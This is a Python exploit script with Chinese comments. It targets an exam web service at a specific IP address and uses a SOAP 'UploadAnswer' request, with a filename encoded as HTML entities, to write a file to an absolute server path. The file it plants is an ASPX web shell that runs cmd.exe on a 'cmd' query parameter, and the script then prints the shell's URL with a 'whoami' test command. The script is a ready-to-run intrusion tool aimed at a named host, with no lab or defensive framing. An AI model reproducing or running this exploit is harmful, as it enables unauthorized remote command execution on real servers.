import requests
import base64
import os

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
SHELL_FILENAME = "cmd_shell.aspx"
# 基于 poc.py 中的路径信息
TARGET_PHYSICAL_PATH = f"e:\\Web\\EXE\\Eiven.EXE.Web\\Eiven.EXE.Web\\{SHELL_FILENAME}"

SHELL_CODE = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            try {
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c " + cmd;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                string error = p.StandardError.ReadToEnd();
                p.WaitForExit();
                Response.Write("<pre>" + output + error + "</pre>");
            } catch (Exception ex) {
                Response.Write("<pre>Error: " + ex.Message + "</pre>");
            }
        }
        else
        {
            Response.Write("<h3>WebShell Active</h3>Usage: ?cmd=whoami");
        }
    }
</script>
"""

HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def to_html_entities(text):
    return "".join(f"&#{ord(c)};" for c in text)

def upload_shell():
    print(f"=== 开始上传 Web Shell ({SHELL_FILENAME}) ===")

    encoded_filename = to_html_entities(TARGET_PHYSICAL_PATH)
    file_b64 = base64.b64encode(SHELL_CODE.encode('utf-8')).decode('utf-8')

    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <UploadAnswer xmlns="http://tempuri.org/">
          <uid>9207</uid>
          <aid>1</aid> <filename>{encoded_filename}</filename>
          <file>{file_b64}</file>
        </UploadAnswer>
      </soap:Body>
    </soap:Envelope>"""

    try:
        headers = HEADERS.copy()
        headers["SOAPAction"] = "http://tempuri.org/UploadAnswer"

        print(f"[*] 目标 URL: {TARGET_URL}")
        print(f"[*] 目标物理路径: {TARGET_PHYSICAL_PATH}")
        print(f"[*] 发送 UploadAnswer 请求...")

        try:
            response = requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=headers, timeout=5)

            if response.status_code == 200:
                print(f"    [+] 上传成功! HTTP 200")
                shell_url = f"http://120.55.241.236:999/{SHELL_FILENAME}"
                print(f"\n[★] Shell 地址: {shell_url}")
                print(f"    测试命令: {shell_url}?cmd=whoami")
            else:
                print(f"    [-] 上传失败, 状态码: {response.status_code}")
                print(f"    {response.text[:200]}")
        except requests.exceptions.ConnectionError:
            print("    [!] 连接失败: 服务器未开启或无法访问。")
            print("    [Info] 脚本已准备好，待服务器开启后即可运行。")

            shell_url = f"http://120.55.241.236:999/{SHELL_FILENAME}"
            print(f"\n[★] 预期 Shell 地址: {shell_url}")
            print(f"    测试命令: {shell_url}?cmd=whoami")

    except Exception as e:
        print(f"    [!] 异常: {e}")

if __name__ == "__main__":
    upload_shell()
